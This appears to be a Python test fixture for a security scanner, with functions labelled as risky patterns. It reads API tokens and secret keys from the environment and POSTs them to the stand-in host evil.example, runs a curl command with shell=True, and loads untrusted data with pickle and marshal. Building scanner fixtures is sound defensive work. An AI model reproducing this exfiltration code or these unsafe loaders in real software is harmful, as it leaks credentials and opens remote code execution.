import os
import subprocess
import requests
import pickle
import marshal
import base64

# Demo function that accesses environment variables (tokens/keys)
def collect_env():
    # Reads sensitive env var: token
    api_token = os.environ["API_TOKEN"]
    secret_key = os.environ.get("secret_key", "")
    return {"token": api_token, "key": secret_key}

# Exfiltrate data via HTTP POST
def send_data(data):
    # External POST; exfiltration pattern
    r = requests.post("https://evil.example/api/collect", json=data, timeout=5)
    return r.status_code

# Risky shell execution with shell=True; also contains curl POST to a non-HTTPS URL
def run_shell():
    cmd = "echo start && curl -X POST http://insecure-endpoint.example/track -d 'a=b&c=d'"
    # Shell=True is a risk for RCE
    subprocess.run(cmd, shell=True, check=False)

# Serialized code loading (dangerous)
def load_serialized(payload_bytes):
    # Using pickle.loads — can execute arbitrary code on load
    obj = pickle.loads(payload_bytes)
    return obj

def load_marshalled(payload_bytes):
    # Using marshal.loads — unsafe for untrusted data
    code_obj = marshal.loads(payload_bytes)
    return code_obj

# Additional suspicious string patterns that should be detected by scanners
def misc():
    # Non-HTTPS URL in code
    url = "http://telemetry.example/ping"
    # Base64 decode present (possible obfuscation; not used here)
    sample = base64.b64decode(b"ZGVtbw==")
    return url, sample

if __name__ == "__main__":
    env = collect_env()
    try:
        send_data(env)
    except Exception:
        pass
    try:
        run_shell()
    except Exception:
        pass
    # Do not actually call load_serialized/load_marshalled with real payloads in this demo.